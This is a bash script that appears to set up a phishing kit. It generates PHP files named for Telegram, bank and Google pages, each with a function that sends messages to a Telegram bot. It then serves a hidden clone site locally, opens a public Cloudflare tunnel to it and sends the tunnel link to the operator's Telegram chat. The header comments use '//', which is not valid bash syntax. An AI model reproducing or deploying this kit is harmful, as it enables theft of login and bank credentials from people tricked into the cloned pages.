#!/bin/bash
// NANO THIS FILE 
//
// nano pi.sh
//
// change the bot token id with a telegram bot api
// change the chat id with a telegram chat id
//
// note: you need Chatid bot to your friend list then to your bot group. this user has a blue fingerprint icon for photo]
//
//
bot_token=""
chat_id=""
host='127.0.0.1'
port='8084'

# Define your custom paths
phpmyadmin_path="/admin/phpmyadmin/index.php"
admin_panel_path="/admin/index.php"
web_app_path="/admin/admin_dashboard.php"
node_app_path="./server.js"

config_dir=".www/config"
config_file="$config_dir/config.sh"

generate_config_file() {
    local file_name="$1.php"
    local config_file="$config_dir/$file_name"

    echo -e "<?php\n\n# Telegram Bot ID and Chat ID\n\$bot_token = \"$bot_token\";\n\$chat_id = \"$chat_id\";\n\n# Sending function for Telegram\n\nfunction send_telegram_message(\$message) {\n    global \$bot_token, \$chat_id;\n    \$url = \"https://api.telegram.org/bot\$bot_token/sendMessage\";\n    \$data = [\n        'chat_id' => \$chat_id,\n        'text' => \$message,\n        'parse_mode' => 'Markdown',\n    ];\n\n    \$options = [\n        'http' => [\n            'header' => \"Content-type: application/x-www-form-urlencoded\\r\\n\",\n            'method' => 'POST',\n            'content' => http_build_query(\$data),\n        ],\n    ];\n\n    \$context = stream_context_create(\$options);\n    file_get_contents(\$url, false, \$context);\n}\n" > "$config_file"

    echo -e "\nConfig file $config_file created successfully."
}

# Generate config files
generate_config_file "telegram"
generate_config_file "link"
generate_config_file "bank"
generate_config_file "google"

start_node_server() {
    node "$node_app_path" > /dev/null 2>&1 &
}

send_telegram_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
        -d "chat_id=$chat_id" \
        -d "text=$message" \
        -d "parse_mode=Markdown"
}

setup_clone() {
    cd .www && php -S "$host":"$port" > /dev/null 2>&1 &
}

get_cloudflared() {
    wget "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" -O cloudflared
    chmod +x cloudflared
    sudo mv cloudflared ./.host/
}

start_cloudflare_tunnel() {
    { sleep 1; setup_clone; }

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    fi

    { sleep 12; clear; }
}

# Start the Node.js server
start_node_server

get_cloudflared
start_cloudflare_tunnel
cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
cldflr_url1=${cldflr_url#https://}
telegram_message="link: $cldflr_url"
send_telegram_message "$telegram_message"
